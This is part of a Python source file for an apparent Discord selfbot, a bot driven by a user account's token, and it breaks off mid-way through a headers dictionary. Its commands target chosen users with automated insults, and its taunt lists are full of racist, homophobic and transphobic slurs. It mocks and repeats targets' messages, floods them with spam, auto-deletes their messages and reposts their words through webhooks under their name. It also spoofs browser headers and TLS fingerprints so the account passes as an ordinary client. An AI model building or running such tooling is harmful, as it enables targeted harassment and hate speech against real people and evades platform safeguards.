⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘⠀⠀⠈⠈⠁⠀⠃⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                        
                                        


⠀⠀⠀⠀                           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

""" 
    global alw_handler
    print(main)
    alw_handler = ALWHandler(bot)  # Initialize the ALWHandler
 


@bot.command()
@require_password()
async def cls(ctx):
    os.system('cls')  
    print (main)
    await ctx.send(f"```Cleared Display UI```") 
    
import re
afk_responded = set()  # Track users who have received a response to prevent further responses
afk_watchers = {}
last_messages = {}  # Initialize the last_messages dictionary
waiting_for_response = {}
def calculate_delay(response: str, wpm: int = 120) -> float:
    word_count = len(response.split())
    delay_per_word = 60 / wpm
    total_delay = word_count * delay_per_word
    return total_delay

@bot.command()
@require_password()
async def antiafk(ctx, user: discord.User):
    if user.id not in afk_watchers:
        afk_watchers[user.id] = True
        await ctx.message.delete()
        await ctx.send(f"Started monitoring {user.mention} for AFK checks.", delete_after=5)
    else:
        await ctx.send(f"{user.mention} is already being monitored.", delete_after=5)

@bot.command()
@require_password()
async def afke(ctx, user: discord.User):
    if user.id in afk_watchers:
        del afk_watchers[user.id]
        await ctx.message.delete()
        await ctx.send(f"Stopped monitoring {user.mention} for AFK checks.", delete_after=2)
    else:
        await ctx.send(f"{user.mention} is not being monitored.", delete_after=5)
        
@bot.command()
@require_password()
async def stfu(ctx, member: discord.Member):
    if member.id not in autodele_users:
        autodele_users[member.id] = True
        await ctx.send(f"{member.mention} has auto delete on them ")
    else:
        await ctx.send(f"{member.mention} has auto delete on them already")

@bot.command()
@require_password()
async def stfuoff(ctx, member: discord.Member):
    if member.id in autodele_users:
        del autodele_users[member.id]
        await ctx.send(f"{member.mention} auto delete has been turned off")
    else:
        await ctx.send(f"{member.mention} doesn't have auto delete on them ")

ping_responses = {}

@bot.command()
@require_password()
async def pingresponse(ctx, action: str, *, response: str = None):
    global ping_responses
    action = action.lower()

    if action == "toggle":
        if ctx.channel.id in ping_responses:
            del ping_responses[ctx.channel.id]
            await ctx.send("```Ping response disabled for this channel.```")
        else:
            if response:
                ping_responses[ctx.channel.id] = response
                await ctx.send(f"```Ping response set to: {response}```")
            else:
                await ctx.send("```Please provide a response to set for pings.```")
    
    elif action == "list":
        if ctx.channel.id in ping_responses:
            await ctx.send(f"```Current ping response: {ping_responses[ctx.channel.id]}```")
        else:
            await ctx.send("```No custom ping response set for this channel.```")
    
    elif action == "clear":
        if ctx.channel.id in ping_responses:
            del ping_responses[ctx.channel.id]
            await ctx.send("```Ping response cleared for this channel.```")
        else:
            await ctx.send("```No custom ping response to clear for this channel.```")
    
    else:
        await ctx.send("```Invalid action. Use toggle, list, or clear.```")


insults_enabled = False  
autoinsults = [
    "your a skid",
    "stfu",
    "your such a loser",
    "fuck up boy",
    "no.",
    "why are you a bitch",
    "nigga you stink",
    "idk you",
    "LOLSSOL WHO ARE YOUa",
    "stop pinging me boy",
    "if your black stfu"
    
]

@bot.command(name="pinginsult")
@require_password()
async def pinginsult(ctx, action: str = None, *, insult: str = None):
    global insults_enabled

    if action is None:
        await ctx.send("```You need to specify an action: toggle, list, or clear.```")
        return

    if action.lower() == "toggle":
        insults_enabled = not insults_enabled  
        status = "enabled" if insults_enabled else "disabled"
        await ctx.send(f"```Ping insults are now {status}!```")

    elif action.lower() == "list":
        if autoinsults:
            insult_list = "\n".join(f"- {insult}" for insult in autoinsults)
            await ctx.send(f"```Current ping insults:\n{insult_list}```")
        else:
            await ctx.send("```No insults found in the list.```")

    elif action.lower() == "clear":
        autoinsults.clear()
        await ctx.send("```Ping insults cleared!```")

    else:
        await ctx.send("```Invalid action. Use toggle, list, or clear.```")

reactions_enabled = False  
custom_reaction = "😜"  
@bot.command(name="pingreact")
@require_password()
async def pingreact(ctx, action: str = None, reaction: str = None):
    global reactions_enabled, custom_reaction

    if action is None:
        await ctx.send("```You need to specify an action: toggle, list, clear, or set.```")
        return

    if action.lower() == "toggle":

        if reaction:
            custom_reaction = reaction  
            reactions_enabled = not reactions_enabled  
            status = "enabled" if reactions_enabled else "disabled"
            await ctx.send(f"```Ping reactions {status}! Custom reaction set to: {custom_reaction}```")
        else:
            reactions_enabled = not reactions_enabled  
            status = "enabled" if reactions_enabled else "disabled"
            await ctx.send(f"```Ping reactions {status}!```")

    elif action.lower() == "list":
        if reactions_enabled:
            await ctx.send(f"```Ping reactions are currently enabled. Current reaction: {custom_reaction}```")
        else:
            await ctx.send("```Ping reactions are currently disabled.```")

    elif action.lower() == "clear":
        reactions_enabled = False  
        await ctx.send("```Ping reactions cleared!```")

    else:
        await ctx.send("```Invalid action. Use toggle, list, or clear.```")

autodele_users = {}
stfu_users = {}


import random
import asyncio
import aiohttp
import requests
import json
from collections import defaultdict

goat_mimic_targets = {}
cached_messages = {}
last_message_ids = defaultdict(str)

mocking_taunts = [
    "<----- a bald ass nigga said this 👨🏿‍🦲 ",
    "<----- a clown said this 🤡 ",
    "<----- an dyke said this 🤓 ",
    "<----- a loser said this 🤢 ",
    "<----- a shitcan said this 🤮",
    "<----- an pedophile said this 💩 ",
    "<----- a twink said this 🤡 ",
    "<----- a fuckin loser said this 💩 ",
    "<----- a tranny said this 🏳️‍🌈 ",
    "<----- a faggot said this 🏳️‍🌈 ",
]

blocked_messages = [
    "1", "2", "i'm ten", "12", "3", "4", "5","6", "9", "10","11"
]


@bot.command()
async def goatmimic(ctx, user_id: int):
    if user_id in goat_mimic_targets:
        await ctx.send(f"Goat Mimic is already active for user with ID {user_id}!")
        return

    goat_mimic_targets[user_id] = True
    await ctx.send(f"Goat Mimic started for user with ID {user_id}. Every message they send will now be mimicked!")

@bot.command()
async def goatmimicend(ctx, user_id: int):
    if user_id in goat_mimic_targets:
        del goat_mimic_targets[user_id]
        await ctx.send(f"Goat Mimic stopped for user {user_id}.")
    else:
        await ctx.send(f"No active Goat Mimic for user {user_id}.")
        


auto_clear_task = None

@bot.command()
async def autocls(ctx, minutes: int = None):
    global auto_clear_task
    
    if minutes is None:
        if auto_clear_task:
            auto_clear_task.cancel()
            auto_clear_task = None
            await ctx.send("```Auto clear disabled```")
        else:
            await ctx.send("```Usage: autocls <minutes>```")
        return
        
    if minutes < 1:
        await ctx.send("```Minutes must be greater than 0```")
        return
        
    if auto_clear_task:
        auto_clear_task.cancel()
    
    async def clear_loop():
        while True:
            await asyncio.sleep(minutes * 60)
            os.system('cls' if os.name == 'nt' else 'clear')
            
    auto_clear_task = bot.loop.create_task(clear_loop())
    await ctx.send(f"```Console will clear every {minutes} minutes```")
    
@bot.command()
async def deafen(ctx, member: discord.Member):
    if not ctx.author.guild_permissions.deafen_members:
        await ctx.send("```You don't have permission to deafen members```")
        return
        
    if not member.voice:
        await ctx.send("```Member is not in a voice channel```")
        return
        
    try:
        await member.edit(deafen=True)
        await ctx.send(f"```Deafened {member.name}#{member.discriminator}```")
    except:
        await ctx.send("```Failed to deafen member```")

@bot.command()
async def undeafen(ctx, member: discord.Member):
    if not ctx.author.guild_permissions.deafen_members:
        await ctx.send("```You don't have permission to deafen members```")
        return
        
    if not member.voice:
        await ctx.send("```Member is not in a voice channel```")
        return
        
    try:
        await member.edit(deafen=False)
        await ctx.send(f"```Undeafened {member.name}#{member.discriminator}```")
    except:
        await ctx.send("```Failed to undeafen member```")
    
@bot.command()
async def isolate(ctx, member: discord.Member):
    if not ctx.author.guild_permissions.manage_roles:
        await ctx.send("```Missing permissions```")
        return
        
    isolated_role = discord.utils.get(ctx.guild.roles, name="Isolated")
    if not isolated_role:
        try:
            isolated_role = await ctx.guild.create_role(name="Isolated")
            for channel in ctx.guild.channels:
                await channel.set_permissions(isolated_role, read_messages=True, send_messages=False, 
                                           speak=False, stream=False, connect=False)
        except:
            await ctx.send("```Failed to create isolated role```")
            return
            
    try:
        if not hasattr(bot, 'isolated_roles'):
            bot.isolated_roles = {}
        bot.isolated_roles[member.id] = [role for role in member.roles if role != ctx.guild.default_role]
        
        await member.remove_roles(*member.roles[1:])  
        await member.add_roles(isolated_role)
        
        await ctx.send(f"```Isolated {member.name}```")
    except:
        await ctx.send("```Failed to isolate member```")

@bot.command()
async def unisolate(ctx, member: discord.Member):
    if not ctx.author.guild_permissions.manage_roles:
        await ctx.send("```Missing permissions```")
        return
        
    if not hasattr(bot, 'isolated_roles') or member.id not in bot.isolated_roles:
        await ctx.send("```No stored roles found for this member```")
        return
        
    try:
        await member.remove_roles(discord.utils.get(ctx.guild.roles, name="Isolated"))
        await member.add_roles(*bot.isolated_roles[member.id])
        
        del bot.isolated_roles[member.id]
        await ctx.send(f"```Restored roles for {member.name}```")
    except:
        await ctx.send("```Failed to restore roles```")






@bot.event
async def on_message(message):
    await bot.process_commands(message)
  
    
    global afk_check_enabled
    
    if message.author.bot:
        return 

    content_lower = message.content.lower()
    channel_id = message.channel.id
    now = datetime.utcnow()

    if afk_check_enabled and bot.user in message.mentions and any(word in content_lower for word in ["afk check", "afkcheck", "say", "afk", "afk chck", "chck", "client check", "autobeef check", "check"]):
        active_checks[channel_id] = now + timedelta(seconds=30)  # Start tracking for 30s
        return  

    if afk_check_enabled and channel_id in active_checks and now < active_checks[channel_id]:
        if re.fullmatch(r"\d+", message.content.strip()):  # Ensure it's just a number
            del active_checks[channel_id]  # Stop tracking AFTER responding
            async with message.channel.typing():
                await asyncio.sleep(1)
                await message.channel.send(random.choice(ANTI_AFK_RESPONSES))
                
                
    if message.author.id in auto_responses:
        message_counters[message.author.id] += 1
        if message_counters[message.author.id] % 3 == 0:  # Skip every 3rd message
            return
        
        async with message.channel.typing():  # Shows typing indicator
            await asyncio.sleep(2)  # Wait 2 seconds
            response = random.choice(auto_responses[message.author.id])
            await message.channel.send(response)
            
            
    if message.author.id in active_users and message.author.id != bot.user.id:
        current_time = message.created_at.timestamp()
        if message.author.id in last_message_time and current_time - last_message_time[message.author.id] < spam_timeout:
            return

        last_message_time[message.author.id] = current_time
        name = active_users[message.author.id]

        async with message.channel.typing():
            await asyncio.sleep(3)

        response_message = generate_unique_reply(name)
        response_type = random.choice(["reply", "ping", "ping"])

        if response_type == "reply":
            await message.reply(response_message, mention_author=True)
        else:
            await message.channel.send(f"{response_message} {message.author.mention}")
            
            










    global ignore_dms

    # If the message is a DM and ignore_dms is enabled
    if message.guild is None and message.author != bot.user:
        if ignore_dms:
            print(f"Silently reading DM from {message.author}")  
            return  # Marks the DM as "read" but does nothing

    


   


   

    
            
            

    if message.author.id in godcar_targets and not message.author.bot:
        target_data = godcar_targets[message.author.id]
        target_data["message_count"] += 1
        
        # Skip responding based on skip_chance
        if random.random() < skip_chance:
            await bot.process_commands(message)
            return
        
        chosen_sentence = random.choice(target_data["sentences"])
        async with message.channel.typing():
            await asyncio.sleep(3)
        
        if random.choice([True, False]):  
            await message.channel.send(f"{chosen_sentence} {message.author.mention}")
        else:
            await message.reply(f"{chosen_sentence}")
            
            
    if message.guild is None and message.author != bot.user:  # If it's a DM
        user_id = message.author.id
        if closedm_enabled.get(user_id, False):  # Check if enabled for user
            try:
                await message.channel.delete()
            except discord.Forbidden:
                print(f"Can't delete DM with {message.author} (permission issue).")
            except discord.HTTPException:
                print(f"Failed to delete DM with {message.author}.")

                
                


                

                
 
                
                
                

    
    
 
    
    

    
    
    
    


    user_id = message.author.id
    if user_id in goat_mimic_targets:
        if message.content.lower() in blocked_messages:
            return 

        try:
            headers = {
                'Authorization': bot.http.token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }

            params = {'after': last_message_ids[user_id]} if last_message_ids[user_id] else {'limit': 1}
            response = requests.get(
                f"https://discord.com/api/v9/channels/{message.channel.id}/messages",
                headers=headers,
                params=params
            )

            if response.status_code == 200:
                messages = response.json()
                
                for msg in reversed(messages):
                    if msg['author']['id'] == str(user_id) and msg['id'] not in cached_messages:
                        content = msg.get('content', '')
                        
                        while content.startswith('.'):
                            content = content[1:].lstrip()
                            
                        if not content:
                            if msg.get('referenced_message'):
                                content = f"Reply to: {msg['referenced_message'].get('content', '[Content Hidden]')}"
                            elif msg.get('mentions'):
                                content = f"Mentioned: {', '.join(m['username'] for m in msg['mentions'])}"
                            elif msg.get('embeds'):
                                embed = msg['embeds'][0]
                                content = embed.get('description', embed.get('title', '[Embed]'))
                            elif msg.get('attachments'):
                                content = '[' + ', '.join(a['filename'] for a in msg['attachments']) + ']'
                            else:
                                continue

                        if content.startswith(('!', '?', '-', '$', '/', '>', '<')):
                            continue

                        cached_messages[msg['id']] = True
                        last_message_ids[user_id] = msg['id']

                        mocked_message = "".join(
                            random.choice([char.upper(), char.lower()]) for char in content
                        )
                        random_taunt = random.choice(mocking_taunts)
                        mimic_reply = f'"{mocked_message}" {random_taunt} <@{user_id}>'

                        payload = {
                            'content': mimic_reply,
                            'message_reference': {
                                'message_id': str(msg['id']),
                                'channel_id': str(message.channel.id),
                                'guild_id': str(message.guild.id) if message.guild else None
                            }
                        }

                        if msg.get('embeds'):
                            payload['embeds'] = msg['embeds']

                        async with aiohttp.ClientSession() as session:
                            async with session.post(
                                f'https://discord.com/api/v9/channels/{message.channel.id}/messages',
                                headers=headers,
                                json=payload
                            ) as resp:
                                if resp.status == 429:
                                    retry_after = (await resp.json()).get('retry_after', 5)
                                    await asyncio.sleep(float(retry_after))
                                    async with session.post(
                                        f'https://discord.com/api/v9/channels/{message.channel.id}/messages',
                                        headers=headers,
                                        json=payload
                                    ) as retry_resp:
                                        if retry_resp.status != 200:
                                            print(f"Error sending message after retry: {retry_resp.status}")

                        await asyncio.sleep(0.5)

        except Exception as e:
            print(f"Error in goat mimic response: {e}")


    if message.author.bot:
        return

    if message.author.id in ar_targets:
        try:
            # Spam management: Skip some messages randomly
            if random.random() < ar_targets[message.author.id]["skip_chance"]:
                return  # Skip this message to avoid spamming

            # Load jokes from the file
            with open("arjokes.txt", "r") as file:
                jokes = file.readlines()

            # Select 2 random jokes
            joke1 = random.choice(jokes).strip()
            joke2 = random.choice(jokes).strip()

            # Get the typing indicator duration for the user
            typing_indicator = ar_targets[message.author.id]["typing_indicator"]

            # Send the first message with a typing indicator and ping
            async with message.channel.typing():
                await asyncio.sleep(typing_indicator)  # Simulate typing delay
                await message.channel.send(f"{message.author.mention} {joke1}")

            # Send the second message with a typing indicator, no ping
            async with message.channel.typing():
                await asyncio.sleep(typing_indicator)  # Simulate typing delay
                await message.channel.send(joke2)

        except Exception as e:
            print(f"Error in auto-reply: {e}")

    if message.author.bot:
        return

    # Check if the author is in the autoflood list for the whole server or DM channel
    if message.guild:  # In server context
        key_server = (message.author.id, str(message.guild.id))  # Log entire server ID
    else:  # In DM or group context
        key_server = (message.author.id, str(message.channel.id))  # Log specific channel ID

    if key_server in auto_flood_users:
        flood_message = auto_flood_users[key_server]
        await send_flood_reply_message(message, flood_message)
        await asyncio.sleep(1.26)  # Adjust rate limit to avoid spamming too quickly
    if message.author.id in autodele_users:
        await message.delete()
    global reacting, current_index, waiting_for_response, afk_responded,kill_target_id, kill_tasks,auto_capitalism,auto_edit_enabled
    
        
        

 


 
    
    if message.author.bot:

        return
    
    def SlotBotData():
        print(f" SERVER: {message.guild}\n CHANNEL: {message.channel}")
        
    if message.author.bot:
        return
    if message.author.id in dreact_users:
        emoji_data = dreact_users[message.author.id]
        emojis, current_index = emoji_data[0], emoji_data[1]
        try:
            await message.add_reaction(emojis[current_index])
            dreact_users[message.author.id][1] = (current_index + 1) % len(emojis)
        except Exception as e:
            print(f"Error adding dreact reaction: {str(e)}")
                
    if message.author.id in autoreact_users:
        emoji = autoreact_users[message.author.id]
        try:
            await message.add_reaction(emoji)
        except Exception as e:
            print(f"Error adding autoreact reaction: {str(e)}")





    user_mention = f"<@{message.author.id}>"




    if user_mention in ar1_targets:

        reply_list = ar1_targets[user_mention]

        if reply_list:

            await message.reply(reply_list[0])

            # Move the first item to the end to cycle through the list

            ar1_targets[user_mention].append(ar1_targets[user_mention].pop(0))

            return  # Prevent further processing of this message



    if user_mention in ar2_targets:

        spaced_list = ar2_targets[user_mention]

        if spaced_list:

            await message.reply(spaced_list[0])

            # Move the first item to the end to cycle through the list

            ar2_targets[user_mention].append(ar2_targets[user_mention].pop(0))

            return  # Prevent further processing of this message

    if message.author.id in afk_watchers:
        # Check for 'check' at the end of the message
        if message.content.lower().endswith("check"):
            delay = calculate_delay("here")
            await asyncio.sleep(delay)
            async with message.channel.typing():
                await asyncio.sleep(random.uniform(0.9, 1.5))
                await message.channel.send("here")
            return

        # If the message ends with 'say', listen for the next message
        if message.content.lower().endswith("say"):
            waiting_for_response[message.author.id] = True
            return  # Wait for a second message

        # Handle first message if it starts with "say"
        if message.content.lower().startswith("say "):
            match = re.search(r'\bsay\s+(.+)', message.content.lower())
            if match:
                response = match.group(1).strip()
                response = re.sub(r'<@!?[0-9]+>', '', response).strip()  # Remove user mentions

                # Replace standalone 'I' followed by 'M' (both standalone) with 'ur'
                response = re.sub(r'\bi\b\s+m\b', 'ur', response, flags=re.IGNORECASE)

                # Replace standalone 'M' with 'r'
                response = re.sub(r'\b(m)\b', 'r', response, flags=re.IGNORECASE)

                # Replace "I am a" with "ur a"
                response = re.sub(r'\b(i am a)\s*(.+)', r'ur a \2', response, flags=re.IGNORECASE)

                # Replace standalone 'I' followed by apostrophe with 'ur'
                response = re.sub(r'\bi\'m\b', 'ur', response, flags=re.IGNORECASE)

                # Replace other variations with "ur"
                response = re.sub(r'\b(im|my|i\'m|i m|im a|i\'m a|I am a)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)
                response = re.sub(r'\b(im|my|i\'m|i m)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)

                # Replace standalone 'I' with 'u'
                response = re.sub(r'\bi\b', 'u', response, flags=re.IGNORECASE)

                # Special cases with variations
                if any(phrase in response.lower() for phrase in ["ur my god", "you’re my god", "you are my god", "ur my god", "youre my god"]):
                    response = "im ur god"
                elif any(phrase in response.lower() for phrase in ["u own me", "you own me"]):
                    response = "i own you"
                elif any(phrase in response.lower() for phrase in ["im ur slut", "ur my slut", "youre my slut", "you are my slut", "u are my slut"]):
                    response = "ur my slut"
                elif any(phrase in response.lower() for phrase in ["im ur bitch", "ur my bitch", "youre my bitch", "you are my bitch", "u are my bitch"]):
                    response = "ur my bitch"

                # Send response
                delay = calculate_delay(response)
                await asyncio.sleep(delay)

                # Simulate typing
                typing_delay = random.uniform(0.9, 1.5)
                async with message.channel.typing():
                    await asyncio.sleep(typing_delay)
                    await message.channel.send(response)
                return  # Prevent further processing

        # Handle cases where the message starts with 'afk', 'bot', or 'client' and includes 'say'
        if (message.content.lower().startswith("afk") or 
            message.content.lower().startswith("bot") or 
            message.content.lower().startswith("client")) and "say" in message.content.lower():
            match = re.search(r'\bsay\s+(.+)', message.content.lower())
            if match:
                response = match.group(1).strip()
                response = re.sub(r'<@!?[0-9]+>', '', response).strip()  # Remove user mentions

                # Replace standalone 'I' followed by 'M' (both standalone) with 'ur'
                response = re.sub(r'\bi\b\s+m\b', 'ur', response, flags=re.IGNORECASE)

                # Replace standalone 'M' with 'r'
                response = re.sub(r'\b(m)\b', 'r', response, flags=re.IGNORECASE)

                # Replace "I am a" with "ur a"
                response = re.sub(r'\b(i am a)\s*(.+)', r'ur a \2', response, flags=re.IGNORECASE)

                # Replace standalone 'I' followed by apostrophe with 'ur'
                response = re.sub(r'\bi\'m\b', 'ur', response, flags=re.IGNORECASE)

                # Replace other variations with "ur"
                response = re.sub(r'\b(im|my|i\'m|i m|im a|my|i\'m a|I am a)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)
                response = re.sub(r'\b(im|my|i\'m|i m)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)

                # Replace standalone 'I' with 'u'
                response = re.sub(r'\bi\b', 'u', response, flags=re.IGNORECASE)

                # Special cases with variations
                if any(phrase in response.lower() for phrase in ["ur my god", "you’re my god", "you are my god", "ur my god", "youre my god"]):
                    response = "im ur god"
                elif any(phrase in response.lower() for phrase in ["u own me", "you own me"]):
                    response = "i own you"
                elif any(phrase in response.lower() for phrase in ["im ur slut", "ur my slut", "youre my slut", "you are my slut", "u are my slut"]):
                    response = "ur my slut"
                elif any(phrase in response.lower() for phrase in ["im ur bitch", "ur my bitch", "youre my bitch", "you are my bitch", "u are my bitch"]):
                    response = "ur my bitch"

                # Send response
                delay = calculate_delay(response)
                await asyncio.sleep(delay)

                # Simulate typing
                typing_delay = random.uniform(0.9, 1.5)
                async with message.channel.typing():
                    await asyncio.sleep(typing_delay)
                    await message.channel.send(response)
                return  # Prevent further processing

    # Check for a second message if the user is waiting for a response
    if message.author.id in waiting_for_response and waiting_for_response[message.author.id]:
        response = message.content.strip()
        response = re.sub(r'<@!?[0-9]+>', '', response).strip()  # Remove user mentions

        # Replace standalone 'I' followed by 'M' (both standalone) with 'ur'
        response = re.sub(r'\bi\b\s+m\b', 'ur', response, flags=re.IGNORECASE)

        # Replace standalone 'M' with 'r'
        response = re.sub(r'\b(m)\b', 'r', response, flags=re.IGNORECASE)

        # Replace "I am a" with "ur a"
        response = re.sub(r'\b(i am a)\s*(.+)', r'ur a \2', response, flags=re.IGNORECASE)

        # Replace standalone 'I' followed by apostrophe with 'ur'
        response = re.sub(r'\bi\'m\b', 'ur', response, flags=re.IGNORECASE)

        # Replace other variations with "ur"
        response = re.sub(r'\b(im|my|i\'m|i m|im a|i\'m a|I am a)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)
        response = re.sub(r'\b(im|my|i\'m|i m)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)

        # Replace standalone 'I' with 'u'
        response = re.sub(r'\bi\b', 'u', response, flags=re.IGNORECASE)

        # Special cases with variations
        if any(phrase in response.lower() for phrase in ["ur my god", "you’re my god", "you are my god", "ur my god", "youre my god"]):
            response = "im ur god"
        elif any(phrase in response.lower() for phrase in ["u own me", "you own me"]):
            response = "i own you"
        elif any(phrase in response.lower() for phrase in ["im ur slut", "ur my slut", "youre my slut", "you are my slut", "u are my slut"]):
            response = "ur my slut"
        elif any(phrase in response.lower() for phrase in ["im ur bitch", "ur my bitch", "youre my bitch", "you are my bitch", "u are my bitch"]):
            response = "ur my bitch"

        # Send the response for the second message
        delay = calculate_delay(response)
        await asyncio.sleep(delay)

        # Simulate typing
        typing_delay = random.uniform(0.9, 1.5)
        async with message.channel.typing():
            await asyncio.sleep(typing_delay)
            await message.channel.send(response)

        del waiting_for_response[message.author.id]  # Clear the waiting state after responding
        return  # Prevent further processing

    

            
    
            
    if bot.user in message.mentions:            
         if reactions_enabled:
            try:
                await message.add_reaction(custom_reaction)
            except Exception as e:
                await message.channel.send(f"```Failed to add reaction: {str(e)}```")

    if insults_enabled and autoinsults:
            insult = random.choice(autoinsults)
            await message.channel.send(insult)
            
    if bot.user.mentioned_in(message) and message.channel.id in ping_responses:
        response = ping_responses[message.channel.id]
        await message.channel.send(f"{response}")

    


            
    if message.author.id in webhookcopy_status and webhookcopy_status[message.author.id]:
        webhook_url = webhook_urls.get(message.author.id)
        if webhook_url:
            webhook_id = webhook_url.split('/')[-2]
            webhook_token = webhook_url.split('/')[-1]
            webhook_info = await bot.fetch_webhook(webhook_id)
            if message.channel.id == webhook_info.channel_id:
                data = {
                    "content": message.content,
                    "username": message.author.display_name,
                    "avatar_url": str(message.author.avatar_url) if message.author.avatar else str(message.author.default_avatar_url)
                }
                await message.delete()
                response = requests.post(webhook_url, json=data)
                if response.status_code == 204:
                    print("Message sent via webhook successfully.")
                else:
                    print(f"Failed to send message via webhook: {response.content.decode()}")
                    
                    
        
    if message.author.id == bot.user.id and not message.content.startswith('.'):
        try:
            content = message.content
            should_edit = False

            if bold_mode and not (content.startswith('#') and content.endswith('#')):
                content = f"# {content}"
                should_edit = True

            if cord_mode and cord_user:
                content = f"{content} {cord_user.mention}"
                should_edit = True
            
            if hash_mode and not (content.startswith('-#') and content.endswith('-#')):
                content = f"-# {content}"
                should_edit = True
                
            if italic_mode:
                content = f" *{content}*"
                should_edit = True
                
            if strong_mode:
                content = f" ```{content}```"
                should_edit = True
                
            if magenta_strong:
                content = f"```ansi\n {magenta} {content}```"
                should_edit = True
                
            if cyan_strong:
                content = f"```ansi\n {cyan} {content}```"
                should_edit = True
                
            if red_strong:
                content = f"```ansi\n {red} {content}```"
                should_edit = True
                
            if yellow_strong:
                content = f"```ansi\n {yellow} {content}```"
                should_edit = True
            if editting:
                content = f"{content}"
                should_edit = True
            

            if should_edit:
                await message.edit(content=content)

        except Exception as e:
            print(f"Failed to edit message: {e}")

    await handle_auto_reply(message)
   # If alw_handler is defined, call its on_message method
    if alw_handler is not None:
        await alw_handler.on_message(message)

    
async def handle_auto_reply(message):
    global auto_reply_target_id, auto_reply_message
    if auto_reply_target_id and message.author.id == auto_reply_target_id:
        await message.reply(auto_reply_message)


@bot.command()
@require_password()
async def alw(ctx, option: str):
    global alw_handler
    if alw_handler is None:
        await ctx.send("ALWHandler is not initialized.")
        return

    if option.lower() == "on":
        alw_handler.alw_enabled = True
        alw_handler.uid = str(ctx.author.id)  # Set user ID from context
        await ctx.send(f"```ansi\n Auto Last Word feature {c} enabled.```")
    elif option.lower() == "off":
        alw_handler.alw_enabled = False
        await ctx.send(f"```ansi\n Auto Last Word feature {mjj} disabled.```")
    else:
        await ctx.send("Invalid option. Use 'on' or 'off'.")  
        

      
    
        
           
@bot.command()
@require_password()
async def wl(ctx, user_id: int):
    """Add a user ID to the whitelist."""
    global alw_handler

    if alw_handler is None:
        await ctx.send("ALWHandler is not initialized.")
        return

    # Add user_id to whitelist
    alw_handler.whitelist.add(str(user_id))  # Add to the in-memory set
    alw_handler.save_whitelist()  # Save to file

    await ctx.send(f"User ID {user_id} has been added to the whitelist.")
    
    


@bot.command(aliases=["pornhubcomment", 'phc'])
@require_password()
async def phcomment(ctx, user: discord.User = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: phcomment <user> <message>')
        return

    avatar_url = user.avatar_url_as(format="png")

    endpoint = f"https://nekobot.xyz/api/imagegen?type=phcomment&text={args}&username={user.name}&image={avatar_url}"
    r = requests.get(endpoint)
    res = r.json()

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"{user.name}_pornhub_comment.png"))
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
        
from tls_client import Session
import base64

randomize_task = None
sesh = Session(client_identifier="chrome_115", random_tls_extension_order=True)


@bot.command()
@require_password()
async def setpfp(ctx, url: str):
    headers = {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IlNhZmFyaSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IFNhZmFyaS82MDUuMS4xNSIsImJyb3dzZXJfdmVyc2lvbiI6IjE2LjUiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = response.headers.get('Content-Type', '')
                if 'gif' in content_type:
                    image_format = 'gif'
                else:
                    image_format = 'png'

                payload = {
                    "avatar": f"data:image/{image_format};base64,{image_b64}"
                }

                response = sesh.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
                
                if response.status_code == 200:
                    await ctx.send("```Successfully set profile picture```")
                else:
                    await ctx.send(f"```Failed to update profile picture: {response.status_code}```")
            else:
                await ctx.send("```Failed to download image from URL```")

@bot.command()
@require_password()
async def setbanner(ctx, url: str):
    headers = {
            "authority": "discord.com",
            "method": "PATCH",
            "scheme": "https",
            "accept": "/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "authorization": bot.http.token,
            "origin": "https://discord.com/",
            "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
